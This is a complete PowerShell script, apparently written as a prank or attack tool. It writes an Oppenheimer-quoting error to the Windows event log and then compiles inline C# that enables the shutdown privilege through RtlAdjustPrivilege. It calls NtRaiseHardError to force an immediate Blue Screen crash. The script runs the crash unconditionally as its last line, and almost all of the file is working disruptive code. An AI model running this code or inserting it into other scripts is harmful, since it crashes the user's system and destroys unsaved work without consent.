$eventSource = "InvokeDeathScript"
$eventLog = "Application"

# Check if the event source exists; if not, create it
if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
    [System.Diagnostics.EventLog]::CreateEventSource($eventSource, $eventLog)
}

function Invoke-Death {
    $source = @"
using System;
using System.Runtime.InteropServices;

public static class CS {
    // Import the 'RtlAdjustPrivilege' function from ntdll.dll. 
    // This function adjusts privileges for the current process or thread.
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    // Import the 'NtRaiseHardError' function from ntdll.dll.
    // This function triggers a hard error (typically results in a system crash or Blue Screen of Death).
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    // Method to simulate a fatal system error (warning: extremely dangerous and not recommended for actual use).
    public static void InvokeDeath() {
        bool previousValue;
        uint response;

        // Adjust the privilege to enable shutdown privileges for the current process.
        RtlAdjustPrivilege(19, true, false, out previousValue);

        // Create an error message to be displayed during the hard error.
        string errorMessage = "Oppenheimer special: Fatal system error occurred!";
        IntPtr errorMessagePtr = Marshal.StringToHGlobalUni(errorMessage); // Convert the string to a pointer.

        // Trigger a hard error with the specified parameters.
        NtRaiseHardError(0xc0000420, 1, 0, errorMessagePtr, 6, out response);

        // Free the memory allocated for the error message pointer.
        Marshal.FreeHGlobal(errorMessagePtr);
    }
}

"@

    # Compile the C# code
    $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $compilerParameters.CompilerOptions = '/unsafe'
    $compiledType = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $compilerParameters

    # Call the method
    [CS]::InvokeDeath()
}



Write-EventLog -LogName $eventLog -Source $eventSource -EventId 1 -EntryType Error -Message "Now I am become Death, the destroyer of worlds."


Invoke-Death
